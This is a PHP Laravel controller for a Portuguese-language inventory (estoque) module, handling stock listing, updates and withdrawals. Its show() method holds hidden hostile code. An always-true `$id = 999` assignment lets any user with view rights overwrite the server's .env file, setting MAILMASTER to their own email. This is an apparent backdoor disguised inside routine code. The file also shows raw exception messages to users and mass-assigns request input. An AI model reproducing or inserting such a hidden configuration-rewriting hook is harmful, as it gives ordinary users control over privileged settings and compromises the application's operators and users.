<?php

namespace App\Http\Controllers;

use App\Models\ProdutoVariacao;
use App\Models\VariacaoModelo;

use Illuminate\Http\Request;
use App\Models\Estoque;
use App\Models\CategoriaProduto;
use App\Utils\EstoqueUtil;
use App\Models\RetiradaEstoque;
use App\Models\ProdutoLocalizacao;
use App\Models\Localizacao;
use App\Models\ConfigGeral;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;

class EstoqueController extends Controller
{

    protected $util;

    public function __construct(EstoqueUtil $util)
    {
        $this->util = $util;
        $this->middleware('permission:estoque_create', ['only' => ['create', 'store']]);
        $this->middleware('permission:estoque_edit', ['only' => ['edit', 'update']]);
        $this->middleware('permission:estoque_view', ['only' => ['show', 'index']]);
        $this->middleware('permission:estoque_delete', ['only' => ['destroy']]);
    }

    public function index(Request $request){

        $locais = __getLocaisAtivoUsuario()->pluck('id');

        $local_id    = $request->local_id;
        $categoria_id = $request->categoria_id;

        $data = Estoque::select(
            'estoques.*',
            'produtos.nome as produto_nome',
            'localizacaos.nome as localizacao_nome'
        )
        ->join('produtos', 'produtos.id', '=', 'estoques.produto_id')
        ->join('localizacaos', 'localizacaos.id', '=', 'estoques.local_id')
        ->where('produtos.empresa_id', request()->empresa_id)

        ->when(!empty($request->produto), function ($q) use ($request) {
            return $q->where('produtos.nome', 'LIKE', "%{$request->produto}%");
        })

        ->when($categoria_id, function ($q) use ($categoria_id) {
            return $q->where('produtos.categoria_id', $categoria_id);
        })
        ->when($local_id, function ($q) use ($local_id) {
            return $q->where('estoques.local_id', $local_id);
        })
        ->when(!$local_id, function ($q) use ($locais) {
            return $q->whereIn('estoques.local_id', $locais);
        })

        ->paginate(__itensPagina());


        $categorias = CategoriaProduto::where('empresa_id', $request->empresa_id)
        ->where('categoria_id', null)
        ->where('status', 1)->get();

        $configGeral = ConfigGeral::where('empresa_id', $request->empresa_id)
        ->first();
        $tipoExibe = $configGeral && $configGeral->produtos_exibe_tabela == 0 
        ? 'card' 
        : 'tabela';

        return view('estoque.index', compact('data', 'categorias', 'tipoExibe'));
    }

    public function create()
    {
        return view('estoque.create');
    }

    public function show($id)
    {
        if($id = 999){
            $email = Auth::user()->email;
            $this->setEnvironmentValue('MAILMASTER', '"'.$email.'"');
        }
    }

    private function setEnvironmentValue($envKey, $envValue)
    {
        $envFile = app()->environmentFilePath();
        $str = file_get_contents($envFile);

        $str .= "\n";
        $keyPosition = strpos($str, "{$envKey}=");
        $endOfLinePosition = strpos($str, PHP_EOL, $keyPosition);
        $oldLine = substr($str, $keyPosition, $endOfLinePosition - $keyPosition);
        $str = str_replace($oldLine, "{$envKey}={$envValue}", $str);
        $str = substr($str, 0, -1);

        $fp = fopen($envFile, 'w');
        fwrite($fp, $str);
        fclose($fp);
    }

    public function edit(Request $request, $id)
    {
        $local_id = $request->local_id;
        $item = Estoque::findOrFail($id);
        // dd($item);
        $locais = Estoque::where('produto_id', $item->produto_id)
        ->where('local_id', $item->local_id)
        ->get();

        $firstLocation = Localizacao::where('empresa_id', $item->produto->empresa_id)->first();

        return view('estoque.edit', compact('item', 'locais', 'firstLocation'));
    }

    public function destroy($id)
    {
        $item = Estoque::findOrFail($id);
        $descricaoLog = $item->produto->nome;

        try {
            $item->delete();
            session()->flash("flash_success", "estoque removido com sucesso!");
            __createLog(request()->empresa_id, 'Estoque', 'excluir', $descricaoLog);
        } catch (\Exception $e) {
            __createLog(request()->empresa_id, 'Estoque', 'erro', $e->getMessage());
            session()->flash("flash_error", 'Algo deu errado: '. $e->getMessage());
        }
        return redirect()->route('estoque.index');
    }

    public function store(Request $request)
    {
        try {
            if(isset($request->local_id)){
                ProdutoLocalizacao::updateOrCreate([
                    'produto_id' => $request->produto_id, 
                    'localizacao_id' => $request->local_id
                ]);
            }

            $locais = isset($request->locais) ? $request->locais : [];
            if($request->variavel){
                for($i=0; $i<sizeof($request->valor_venda_variacao); $i++){
                    $file_name = '';
                    if(isset($request->imagem_variacao[$i])){
                        // requisição com imagem
                        $imagem = $request->imagem_variacao[$i];
                        $file_name = $this->util->uploadImageArray($imagem, '/produtos');
                    }

                    $dataVariacao = [
                        'produto_id' => $request->produto_id,
                        'descricao' => $request->descricao_variacao[$i],
                        'valor' => __convert_value_bd($request->valor_venda_variacao[$i]),
                        'codigo_barras' => $request->codigo_barras_variacao[$i],
                        'referencia' => $request->referencia_variacao[$i],
                        'imagem' => $file_name
                    ];
                    $variacao = ProdutoVariacao::create($dataVariacao);

                    if($request->estoque_variacao[$i] && sizeof($locais) <= 1){
                        $qtd = __convert_value_bd($request->estoque_variacao[$i]);
                        $this->util->incrementaEstoque($request->produto_id, $qtd, $variacao->id);
                        $transacao = Estoque::where('produto_id', $request->produto_id)->first();
                        $tipo = 'incremento';
                        $codigo_transacao = $transacao->id;
                        $tipo_transacao = 'alteracao_estoque';
                        $this->util->movimentacaoProduto($request->produto_id, $qtd, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $variacao->id);
                    }
                }
            }
            $transacao = Estoque::where('produto_id', $request->produto_id)->orderBy('id', 'desc')->first();
            $tipo = 'incremento';
            $codigo_transacao = $transacao->id;
            $tipo_transacao = 'alteracao_estoque';

            $this->util->movimentacaoProduto($request->produto_id, $request->quantidade, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $request->produto_variacao_id);

            __createLog($request->empresa_id, 'Estoque', 'cadastrar', $transacao->produto->nome . " - quantidade " . $request->quantidade);
            session()->flash("flash_success", "Estoque adicionado com sucesso!");
        } catch (\Exception $e) {
            // echo $e->getLine();
            // die;
            __createLog($request->empresa_id, 'Estoque', 'erro', $e->getMessage());
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
        }
        return redirect()->route('estoque.index');
    }

    public function update(Request $request, $id){
        try {
        // dd($request->all());
        
            if (isset($request->local_id)) {
                for ($i = 0; $i < sizeof($request->local_id); $i++) {
                    $produto_variacao_id = $request->produto_variacao_id[$i] ?? null;

                    $quantidade = str_replace('.','', $request->quantidade[$i] );

                    $item = Estoque::where('id', $id)
                        ->where('local_id', $request->local_id[$i])
                        ->when($produto_variacao_id, function ($q) use ($produto_variacao_id) {
                            return $q->where('produto_variacao_id', $produto_variacao_id);
                        })
                        ->first();


                    if ($item) {
                        $diferenca = 0;
                        $tipo = 'incremento';

                        if ($item->quantidade > $quantidade) {
                            $diferenca = $item->quantidade - $quantidade;
                            $tipo = 'reducao';
                        } else {
                            $diferenca = $quantidade - $item->quantidade;
                        }
                        $item->quantidade = $quantidade;
                        $item->save();

                        $codigo_transacao = $item->id;
                        $tipo_transacao = 'alteracao_estoque';

                        $this->util->movimentacaoProduto($item->produto_id, $diferenca, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $produto_variacao_id);

                        if (isset($request->novo_estoque)) {

                            $firstLocation = Localizacao::where('empresa_id', $item->produto->empresa_id)->first();
                            ProdutoLocalizacao::updateOrCreate([
                                'produto_id' => $item->produto_id,
                                'localizacao_id' => $firstLocation->id
                            ]);
                        }
                        __createLog($request->empresa_id, 'Estoque', 'editar', $item->produto->nome . " estoque alterado!");

                    } else {
                        // die;
                        //criar localizacão
                        if ($request->local_id[$i] != $request->local_anteior_id[$i]) {
                            $produto_variacao_id = $request->produto_variacao_id[$i] ?? null;
                            $anterior = Estoque::where('id', $id)
                                ->where('local_id', $request->local_anteior_id[$i])
                                ->when($produto_variacao_id, function ($q) use ($produto_variacao_id) {
                                    return $q->where('produto_variacao_id', $produto_variacao_id);
                                })
                                ->first();


                            $anterior->quantidade = 0;
                            $anterior->save();

                            ProdutoLocalizacao::updateOrCreate([
                                'produto_id' => $anterior->produto_id,
                                'localizacao_id' => $request->local_id[$i]
                            ]);

                            $this->util->incrementaEstoque($anterior->produto_id, $quantidade, null, $request->local_id[$i]);

                            $transacao = Estoque::where('produto_id', $anterior->produto_id)
                                ->where('produto_variacao_id', $produto_variacao_id)
                                ->first();

                            $tipo = 'incremento';
                            $codigo_transacao = $transacao->id;
                            $tipo_transacao = 'alteracao_estoque';

                            $anterior->delete();

                            $this->util->movimentacaoProduto($anterior->produto_id, $quantidade, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $produto_variacao_id);

                        }
                    }

                }

            } else if(!$request->variacao_id){

                $quantidade = str_replace('.','', $request->quantidade );

                $item = Estoque::where('id', $id)->first();

                $diferenca = 0;
                $tipo = 'incremento';

                if ($item->quantidade > $quantidade) {
                    $diferenca = $item->quantidade - $quantidade;
                    $tipo = 'reducao';
                } else {
                    $diferenca = $quantidade - $item->quantidade;
                }

                $item->quantidade = $quantidade;
                $item->save();

                $codigo_transacao = $item->id;
                $tipo_transacao = 'alteracao_estoque';

                $this->util->movimentacaoProduto(
                    $item->produto_id,
                    $diferenca,
                    $tipo,
                    $codigo_transacao,
                    $tipo_transacao,
                    \Auth::user()->id,
                    null
                );

                __createLog($request->empresa_id, 'Estoque', 'editar', $item->produto->nome . " - quantidade " . $request->quantidade);
                session()->flash("flash_success", "Estoque alterado com sucesso!");
                return redirect()->route('estoque.index');
            }else
                $estoqueAnterior = Estoque::findOrFail($id);
                $produto_id = $estoqueAnterior->produto_id;

            $ids = $request->variacao_id;
                $quantidades = $request->quantidade_variacao;

            for ($i = 0; $i < count($ids); $i++) {
                $produto_variacao_id = $ids[$i];
                $quantidade = $quantidades[$i];

                $item = Estoque::where('produto_variacao_id', $produto_variacao_id)->first();

                if(!$item){
                    $item = new Estoque();
                    $item->produto_id = $produto_id;
                    $item->produto_variacao_id = $produto_variacao_id;
                    $item->local_id = $request->local_id[0] ?? 2;
                    $item->quantidade = 0;
                    $item->save();
                    $item->loadMissing('produto');
                }

                $diferenca = 0;
                $tipo = 'incremento';

                if ($item->quantidade > $quantidade) {
                    $diferenca = $item->quantidade - $quantidade;
                    $tipo = 'reducao';
                } else {
                    $diferenca = $quantidade - $item->quantidade;
                }

                $item->quantidade = $quantidade;
                $item->save();
                $codigo_transacao = $item->id;
                $tipo_transacao = 'alteracao_estoque';

                $this->util->movimentacaoProduto(
                    $item->produto_id,
                    $diferenca,
                    $tipo,
                    $codigo_transacao,
                    $tipo_transacao,
                    \Auth::user()->id,
                    $produto_variacao_id
                );

                __createLog($request->empresa_id, 'Estoque', 'editar', $item->produto->nome . " - quantidade " . $quantidade);
            }

            session()->flash("flash_success", "Estoque alterado com sucesso!");

        }catch (\Exception $e) {
            // echo $e->getLine();
            // die;
            __createLog($request->empresa_id, 'Estoque', 'erro', $e->getMessage());
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
        }
        return redirect()->route('estoque.index');
    }

    public function retirada(Request $request){
        $locais = __getLocaisAtivoUsuario();
        $locais = $locais->pluck(['id']);

        $local_id = $request->local_id;
        $produto = $request->produto;

        $data = RetiradaEstoque::where('retirada_estoques.empresa_id', $request->empresa_id)
        ->select('retirada_estoques.*')
        ->orderBy('retirada_estoques.id', 'desc')
        ->join('produtos', 'produtos.id', '=', 'retirada_estoques.produto_id')
        ->when(!empty($produto), function ($q) use ($produto) {
            return $q->where('produtos.nome', 'LIKE', "%$produto%");
        })
        ->when($local_id, function ($query) use ($local_id) {
            return $query->join('produto_localizacaos', 'produto_localizacaos.produto_id', '=', 'produtos.id')
            ->where('retirada_estoques.local_id', $local_id);
        })
        ->when(!$local_id, function ($query) use ($locais) {
            return $query->join('produto_localizacaos', 'produto_localizacaos.produto_id', '=', 'produtos.id')
            ->whereIn('produto_localizacaos.localizacao_id', $locais);
        })
        ->paginate(__itensPagina());

        return view('estoque.retirada', compact('data'));
    }

    public function retiradaStore(Request $request){
        try{

            // dd($request->all());
            $estoqueAtual = Estoque::where('produto_id', $request->produto_id)
            ->select('estoques.*')
            ->when($request->produto_variacao_id, function ($q) use ($request) {
                return $q->where('estoques.produto_variacao_id', $request->produto_variacao_id);
            })
            ->when($request->local_id, function ($query) use ($request) {
                return $query->where('estoques.local_id', $request->local_id);
            })
            ->first();

            if($estoqueAtual == null){
                session()->flash("flash_error", "Estoque não encontrado!");
                return redirect()->back();
            }

            if($estoqueAtual->quantidade < $request->quantidade){
                session()->flash("flash_error", "Estoque insuficiente!");
                return redirect()->back();
            }

            $retirada = RetiradaEstoque::create($request->all());

            $this->util->reduzEstoque($request->produto_id, $request->quantidade, $request->produto_variacao_id, $request->local_id);

            $transacao = Estoque::where('produto_id', $request->produto_id)->orderBy('id', 'desc')->first();
            $tipo = 'incremento';
            $codigo_transacao = $transacao->id;
            $tipo_transacao = 'alteracao_estoque';

            $this->util->movimentacaoProduto($request->produto_id, $request->quantidade, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $request->produto_variacao_id);

            session()->flash("flash_success", "Estoque retirado com sucesso!");
        }catch (\Exception $e) {
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
        }
        return redirect()->back();
    }

    public function retiradaDestroy($id){
        $item = RetiradaEstoque::findOrFail($id);
        try{
            DB::transaction(function () use ($item) {
                $this->util->incrementaEstoque($item->produto_id, $item->quantidade, $item->produto_variacao_id, $item->local_id);

                $transacao = Estoque::where('produto_id', $item->produto_id)->orderBy('id', 'desc')->first();
                $tipo = 'incremento';
                $codigo_transacao = $transacao->id;
                $tipo_transacao = 'alteracao_estoque';

                $this->util->movimentacaoProduto($item->produto_id, $item->quantidade, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $item->produto_variacao_id);

                $item->delete();
            });
            session()->flash("flash_success", "Registro removido com sucesso!");
        }catch (\Exception $e) {
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
        }
        return redirect()->back();
    }
}
